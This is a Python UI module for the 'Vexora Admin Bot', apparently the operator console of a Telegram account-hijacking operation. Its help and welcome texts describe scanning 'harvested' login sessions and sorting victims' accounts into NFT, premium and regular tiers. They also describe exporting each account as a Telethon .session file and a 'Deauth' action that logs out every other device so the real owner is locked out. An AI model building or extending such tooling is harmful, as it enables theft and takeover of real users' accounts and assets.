"""Keyboards, texts and premium-message helpers for the Vexora Admin Bot.

Mirrors the main bot's ``ui.py`` style (colourful reply keyboard + Telegram
premium custom emoji), but scoped to admin actions.
"""
import math
import time
import asyncio

from pyrogram import types
from pyrogram.enums import ParseMode, MessageEntityType
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, KeyboardButtonStyle,
    InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity,
)
from pyrogram.errors import FloodWait, MessageNotModified, RPCError

from adminconfig import PREMIUM_EMOJI, logger
from adminclient import admin_app

PAGE_SIZE = 10

# Category metadata: code -> (title, icon emoji)
CATEGORIES = {
    "nft":     ("NFT Accounts",     "💫"),
    "premium": ("Premium Accounts", "⚡"),
    "regular": ("Regular Accounts", "👥"),
    "all":     ("All Accounts",     "📊"),
}


# ==================== PREMIUM MESSAGE BUILDER ====================
def _custom_emoji_entities(text: str):
    entities = []
    for emoji, custom_id in sorted(PREMIUM_EMOJI.items(), key=lambda kv: -len(kv[0])):
        start = 0
        while True:
            index = text.find(emoji, start)
            if index < 0:
                break
            prefix = text[:index].encode("utf-16-le")
            length = emoji.encode("utf-16-le")
            entities.append(MessageEntity(
                type=MessageEntityType.CUSTOM_EMOJI,
                offset=len(prefix) // 2,
                length=len(length) // 2,
                custom_emoji_id=int(custom_id),
            ))
            start = index + len(emoji)
    return entities


async def build_message(text: str) -> tuple[str, list]:
    parsed = await admin_app.parser.parse(text, ParseMode.MARKDOWN)
    clean_text = parsed["message"]
    raw_entities = parsed.get("entities") or []
    entities = []
    for e in raw_entities:
        wrapped = types.MessageEntity._parse(None, e, {})
        if wrapped is not None:
            entities.append(wrapped)
    entities.extend(_custom_emoji_entities(clean_text))
    return clean_text, entities


async def reply_premium(message, text: str, reply_markup=None):
    body, ents = await build_message(text)
    return await message.reply_text(body, reply_markup=reply_markup, entities=ents)


async def send_premium(chat_id: int, text: str, reply_markup=None):
    body, ents = await build_message(text)
    return await admin_app.send_message(chat_id, body, reply_markup=reply_markup, entities=ents)


# ==================== SAFE EDIT ====================
_last_edits: dict = {}


async def safe_edit_text(message, text: str, reply_markup=None, min_interval: float = 0.0):
    if not message:
        return
    key = (message.chat.id, message.id)
    now = time.time()
    if key in _last_edits and (now - _last_edits[key]) < min_interval:
        return
    try:
        body, ents = await build_message(text)
        await message.edit_text(body, reply_markup=reply_markup, entities=ents)
        _last_edits[key] = time.time()
    except FloodWait as e:
        if e.value <= 10:
            await asyncio.sleep(e.value)
            try:
                body, ents = await build_message(text)
                await message.edit_text(body, reply_markup=reply_markup, entities=ents)
            except Exception as inner:
                logger.debug(f"[safe_edit_text] retry failed: {inner}")
    except MessageNotModified:
        pass
    except RPCError as e:
        logger.debug(f"[safe_edit_text] RPCError: {e}")
    except Exception as e:
        logger.warning(f"[safe_edit_text] unexpected: {e}")


# ==================== BUTTONS ====================
def styled_button(text: str, icon_emoji: str, colour: str = "blue") -> KeyboardButton:
    style = KeyboardButtonStyle(
        bg_primary=colour == "blue",
        bg_danger=colour == "red",
        bg_success=colour == "green",
        icon=int(PREMIUM_EMOJI[icon_emoji]),
    )
    return KeyboardButton(text, style=style)


# Canonical labels (icon comes from style).
ABTN_SCAN    = "Scan Sessions"
ABTN_NFT     = "NFT Accounts"
ABTN_PREMIUM = "Premium Accounts"
ABTN_REGULAR = "Regular Accounts"
ABTN_ALL     = "All Accounts"
ABTN_STATS   = "Stats"
ABTN_DEAUTH  = "Deauth"
ABTN_HELP    = "Help"
ABTN_CANCEL  = "Cancel"


def get_admin_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup([
        [styled_button(ABTN_SCAN, "🔄", "green")],
        [styled_button(ABTN_NFT,     "💫", "blue"),
         styled_button(ABTN_PREMIUM, "⚡", "blue"),
         styled_button(ABTN_REGULAR, "👥", "blue")],
        [styled_button(ABTN_ALL,   "📊", "blue"),
         styled_button(ABTN_STATS, "📩", "blue")],
        [styled_button(ABTN_DEAUTH, "🔒", "red"),
         styled_button(ABTN_HELP,   "ℹ️", "blue")],
    ], resize_keyboard=True, one_time_keyboard=False)


def cancel_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [[styled_button(ABTN_CANCEL, "🔙", "blue")]],
        resize_keyboard=True,
    )


# ==================== TEXTS ====================
WELCOME_TEXT = (
    "🛡️ **Vexora Admin Console**\n"
    "\n"
    "Manage every account harvested by @VexoraAdsBot.\n"
    "\n"
    "• 🔄 **Scan Sessions** — pull & classify all logged-in accounts\n"
    "• 💫 **NFT** / ⚡ **Premium** / 👥 **Regular** — browse by tier\n"
    "• 📊 **All Accounts** — the full list, paginated\n"
    "• 🔒 **Deauth** — kill every other device on an account\n"
    "\n"
    "Tap **Scan Sessions** to begin."
)

HELP_TEXT = (
    "ℹ️ **Admin Help**\n"
    "\n"
    "**🔄 Scan Sessions**\n"
    "Reads every session from the shared DB, connects each account and tags it "
    "as 💫 NFT, ⚡ Premium or 👥 Regular. Run this first.\n"
    "\n"
    "**Browse**\n"
    "Open a tier to see usernames, 10 per page, with ⬅️ / ➡️ paging.\n"
    "Tap any `@username` to receive that account as a Telethon `.session` "
    "inside a `@username.zip`. Use **Export All** to dump the whole tier.\n"
    "\n"
    "**🔒 Deauth**\n"
    "Send a session string; the bot logs out every OTHER device on that "
    "account while keeping its own session (and the exported `.session`) valid.\n"
    "\n"
    "**👑 Owner commands**\n"
    "`/addadmin <id | @username>` — grant admin access\n"
    "`/deladmin <id | @username>` — revoke access\n"
    "`/admins` — list all admins\n"
    "\n"
    "Made by **Vexora** 💫"
)


def get_stats_text(accounts: list[dict], scanned: bool) -> str:
    if not scanned:
        return (
            "📊 **Stats**\n\n"
            "No scan yet. Tap **🔄 Scan Sessions** first."
        )
    total = len(accounts)
    ok = sum(1 for a in accounts if a["ok"])
    dead = total - ok
    nft = sum(1 for a in accounts if a["ok"] and a["category"] == "nft")
    prem = sum(1 for a in accounts if a["ok"] and a["category"] == "premium")
    reg = sum(1 for a in accounts if a["ok"] and a["category"] == "regular")
    return (
        "📊 **Scan Results**\n"
        "\n"
        f"Total accounts   ·  `{total}`\n"
        f"Live ✅           ·  `{ok}`\n"
        f"Dead ❌           ·  `{dead}`\n"
        "\n"
        f"💫 NFT           ·  `{nft}`\n"
        f"⚡ Premium       ·  `{prem}`\n"
        f"👥 Regular       ·  `{reg}`\n"
    )


# ==================== ACCOUNT LIST (paginated inline) ====================
def account_label(acc: dict) -> str:
    if acc.get("username"):
        return f"@{acc['username']}"
    if acc.get("name"):
        return f"{acc['name']} · {acc.get('user_id') or '?'}"
    return f"id {acc.get('user_id') or '?'}"


def paginate(items: list, page: int) -> tuple[list, int, int]:
    total_pages = max(1, math.ceil(len(items) / PAGE_SIZE))
    page = max(1, min(page, total_pages))
    start = (page - 1) * PAGE_SIZE
    return items[start:start + PAGE_SIZE], page, total_pages


def build_list_view(cat: str, items: list[dict], page: int) -> tuple[str, InlineKeyboardMarkup]:
    title, icon = CATEGORIES.get(cat, ("Accounts", "📊"))
    page_items, page, total_pages = paginate(items, page)
    start = (page - 1) * PAGE_SIZE

    if not items:
        text = f"{icon} **{title}**\n\nNo accounts in this tier."
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("✖ Close", callback_data="adm:x")]])
        return text, kb

    lines = [f"{icon} **{title}**", ""]
    rows = []
    for i, acc in enumerate(page_items):
        pos = start + i           # stable index within the filtered list
        number = pos + 1
        tag = account_label(acc)
        badge = "💫" if acc["category"] == "nft" else ("⚡" if acc["category"] == "premium" else "👤")
        status = "" if acc["ok"] else " ❌"
        lines.append(f"`{number:>3}.` {badge} {tag}{status}")
        rows.append([InlineKeyboardButton(f"⬇️ {number}. {tag}", callback_data=f"adm:one:{cat}:{pos}")])

    lines.append("")
    lines.append(f"Page **{page}/{total_pages}**  ·  {len(items)} total")

    nav = []
    if page > 1:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"adm:pg:{cat}:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="adm:noop"))
    if page < total_pages:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"adm:pg:{cat}:{page+1}"))
    rows.append(nav)
    rows.append([
        InlineKeyboardButton("📦 Export All", callback_data=f"adm:all:{cat}"),
        InlineKeyboardButton("✖ Close", callback_data="adm:x"),
    ])
    return "\n".join(lines), InlineKeyboardMarkup(rows)
